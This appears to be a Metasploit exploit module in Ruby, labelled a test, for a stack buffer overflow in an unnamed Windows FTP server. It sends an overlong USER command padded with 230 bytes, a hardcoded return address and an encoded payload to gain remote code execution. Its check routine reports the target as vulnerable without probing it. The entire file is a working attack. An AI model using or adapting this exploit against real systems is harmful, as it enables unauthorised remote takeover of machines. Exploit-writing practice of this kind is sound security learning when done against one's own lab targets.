require 'msf/core'
	class MetasploitModule < Msf::Exploit::Remote
	Rank = NormalRanking
	include Exploit::Remote::Tcp
	
	def initialize(info={})
		super(
			update_info(
			info,
			"Name" => "Test FTP buffer oveflow.",
			"License" => MSF_LICENSE,
			'Privileged'	 => false,
			"Author" => "Ngovinhhuy",
			'Arch'		=> ARCH_X86,
			'Platform'	=> 'win',
			"Payload" => {
				"Space" => 400,
				"BadChars" => "\x00\x0a\x0d",
			},
			"Targets" => 
			[
				[
					"Windows Universal",
					{
						"Ret"=>0x7750595B,
					}
				]
			],
			'DefaultTarget'  => 0
			)
		)
	end
	def check
	 Exploit::CheckCode::Vulnerable
	end
	
	def exploit
		connect
		print_status("Exploiting......")
		buf="USER "
		offset=230
		buf<< "A"*offset
		buf<< [target.ret].pack('V')
		buf<< payload.encoded
		buf<< "\r\n"
		sock.put(buf)
		handler
		disconnect
	end
end
